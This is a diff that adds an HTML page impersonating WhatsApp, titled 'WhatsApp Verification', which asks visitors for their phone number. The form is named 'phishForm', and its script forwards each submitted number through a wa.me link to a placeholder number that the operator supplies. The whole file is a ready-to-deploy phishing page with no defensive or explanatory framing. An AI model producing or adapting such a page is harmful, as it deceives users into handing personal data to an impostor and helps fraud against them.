@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>WhatsApp Verification</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #25D366;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+  }
+  #container {
+    background: white;
+    color: #212121;
+    max-width: 400px;
+    width: 90%;
+    border-radius: 8px;
+    padding: 24px;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.3);
+    text-align: center;
+  }
+  h1 {
+    margin-bottom: 8px;
+    font-weight: 700;
+    color: #075E54;
+  }
+  p {
+    margin: 8px 0 24px;
+    font-size: 1rem;
+    color: #333;
+  }
+  input[type="text"], input[type="tel"] {
+    width: 100%;
+    font-size: 1rem;
+    padding: 10px 14px;
+    margin-bottom: 20px;
+    border-radius: 5px;
+    border: 1px solid #ddd;
+    box-sizing: border-box;
+  }
+  button {
+    background-color: #25D366;
+    border: none;
+    color: white;
+    padding: 12px 0;
+    font-weight: 700;
+    font-size: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #128C7E;
+  }
+  small {
+    display: block;
+    margin-top: 12px;
+    color: #555;
+  }
+</style>
+</head>
+<body>
+  <div id="container">
+    <h1>WhatsApp Verification</h1>
+    <p>Please enter your phone number to receive a verification code.</p>
+    <form id="phishForm" autocomplete="off">
+      <input type="tel" id="phone" name="phone" placeholder="Your phone number" required pattern="^\+?\d{10,15}$" title="Enter phone number including country code" />
+      <button type="submit">Verify</button>
+      <small>We will send a code to your WhatsApp.</small>
+    </form>
+  </div>
+
+<script>
+  const form = document.getElementById('phishForm');
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var phone = document.getElementById('phone').value.trim();
+    // Validate basic phone number pattern with country code
+    if (!phone.match(/^\+?\d{10,15}$/)) {
+      alert('Please enter a valid phone number including country code.');
+      return;
+    }
+    var message = encodeURIComponent("Verification request from: " + phone);
+    var waNumber = "YOUR_WHATSAPP_NUMBER_WITH_COUNTRY_CODE"; // Replace with your number e.g. 6281234567890
+
+    // Open WhatsApp with message param
+    var url = "https://wa.me/" + waNumber + "?text=" + message;
+
+    window.location.href = url;
+  });
+</script>
+</body>
+</html>
+
+```
